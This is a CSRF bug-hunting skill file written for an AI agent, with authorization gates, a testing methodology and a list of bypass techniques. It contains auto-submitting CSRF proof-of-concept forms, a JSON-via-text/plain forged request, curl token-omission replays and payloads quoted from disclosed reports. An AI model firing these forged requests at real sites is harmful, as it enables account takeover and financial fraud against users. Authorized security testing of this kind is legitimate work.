---
name: hunt-csrf
description: Hunting skill for csrf vulnerabilities.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public, bugcrowd_public, github_security_advisories
report_count: 18
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Browser delivery is required for confirmation

Raw clients can vary headers to diagnose checks, but can spoof values a browser cannot send. Success with an authenticated cookie and forged Origin is not CSRF evidence. Confirm a harmless reversible state change using a real supported browser, separate controlled origin and test accounts, documenting cookies, SameSite, preflight, redirects and actual before/after state. Never transfer money or alter real users as a demonstration.

## Autonomous Testing Priority

**CSRF only matters on state-changing actions that a browser could be tricked into making cross-site.**

**Testing flow:**
1. **GET the form endpoint** to establish a baseline and check what fields exist (look for hidden `csrf_token`, `authenticity_token`, `_token`, `csrfmiddlewaretoken` fields).
2. **POST the state-changing action without any CSRF token field.** Send only the functional parameters (email, amount, etc.).
3. **Use a "simple-request" Content-Type** — `application/x-www-form-urlencoded`, `multipart/form-data`, OR `text/plain` are the three CORS "simple" content-types a cross-origin form can send with no preflight. A JSON endpoint is CSRF-resistant **only if the server rejects those** — if it also accepts a `text/plain` body (common), craft a `text/plain` payload that parses as valid JSON (see the JSON-CSRF-via-text/plain section). Don't skip a JSON endpoint on the assumption that `application/json` alone is protective.
4. **A successful raw replay is only a candidate. Confirm browser-deliverable credentials and the actual state change.**

**High-value targets (in order of impact):**
- Email/password change → account takeover
- Money transfer or payment → financial fraud
- Admin actions (role assignment, user deletion)
- OAuth social-account linking → persistent ATO

**Token bypass techniques when a token IS present:**
- Omit the token field entirely — some frameworks only validate if the field exists, not if it's absent
- Send an empty value (`_token=`) — some validate format, not presence
- Copy a token from another session — some tokens aren't tied to the session

**Scope:** Login CSRF can have impact and belongs in an authorized assessment; evaluate logout by concrete harm. GET endpoints can also mutate state. Exclude only genuinely read-only behavior.

---

## Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

## Attack Surface Signals

### URL Patterns
```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

### Response Header Signals
```
# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # inspect browser default and delivery; absence alone is not proof
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# Missing CSRF headers
# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # wildcard origin cannot authorize credentialed CORS in browsers
```

### JS / DOM Patterns
```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Tech Stack Signals
- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

## Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (stable per-session tokens may be valid)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. A 200 response alone does not prove CSRF; verify browser delivery and state change.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

## Payload & Detection Patterns

### Basic CSRF PoC (Form POST)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### JSON CSRF via text/plain (bypasses Content-Type check)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat"
        enctype="text/plain">
    <!-- browser sends: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

### curl: Test CSRF token omission
```bash
# Capture a valid request, then replay without token
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" \
  -v 2>&1 | grep -E "HTTP|location|error"
```

### curl: Test token reuse across sessions
```bash
# Get token from session A
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')

# Use token A in session B's request
curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
  -v
```

### Grep patterns for recon
```bash
# Find CSRF token fields in HTML responses
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'

# Find forms without CSRF tokens
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"

# Check SameSite in response headers
curl -sI https://target.com/login | grep -i "set-cookie"

# Find RelayState parameters
grep -r "RelayState" --include="*.js" .
```

### Grafana CVE-2022-21703 version check
```bash
curl -s https://monitoring.target.com/api/health | jq '.version'
# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
```

---

## Common Root Causes

1. **Predictable, exposed or improperly bound tokens** — A random per-session token can be legitimate; stability alone is not a vulnerability.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

## Bypass Techniques

### Defense: SameSite=Lax cookies
**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.

### Defense: CSRF token present
**Bypasses:**
- Token is static per session — steal via XSS, Referer leakage, or cached page
- Token not validated server-side — just remove it and try
- Token validated by length/format only — submit a fake but correctly-formatted value
- Token tied to session but session is predictable

### Defense: `Content-Type: application/json` enforcement
**Candidate only if enforcement fails:** `text/plain` cannot bypass a server that strictly rejects it; confirm the server actually accepts a browser-generated body.

### Defense: Referer/Origin header check
**Bypasses:**
- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
- Referer stripping: HTTPS→HTTP transitions strip Referer header
- Weak matching: `target.com.evil.com` passes naive string matching

### Defense: Double-submit cookie pattern
**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.

### Defense: Custom request header (e.g., `X-Requested-With`)
**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.

---

### Mobile-app CSRF via custom-scheme deeplink
CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.

## Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — with documented prerequisites and reasonable effort; ten minutes is not a validity requirement.

---

## Real Impact Examples

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

## Disclosed Report Citations (Backfill +5 — 2020-2024)

The following upstream case descriptions and payout figures have not been independently verified in this catalog review; consult each primary disclosure before citing it. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).

11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4

12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
    - Year: 2021 — **$3,370**

13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
    - Subclass: framework misconfiguration — middleware globally disabled
    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)

14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
    - Year: 2022 — **$10,000**

15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
    - Subclass: account-link CSRF (social provider attach without state binding)
    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
    - Year: 2022 — informational scope on H1 self-program, but public PoC

---

## BFF and WebSocket assessment boundaries

A static custom header can be a valid CSRF defense when cross-origin callers cannot set it without an approved preflight. It is not intended to authorize roles. A same-origin XSS running with an administrator's session is not proof of a separate role-token CSRF flaw; test low-privilege authorization using that low-privilege session. WebSocket handshake success alone is also insufficient: verify origin restrictions, authentication, hub/method authorization and a harmless operation. Cookie-domain injection is not automatically account takeover; establish the session behavior and attacker capabilities. Do not claim product CVEs or universal flaws from these hypotheses.

## Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Historical report counts, payouts and case attributions are upstream claims, not independently verified evidence. Never infer severity from payout or a missing header alone.

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
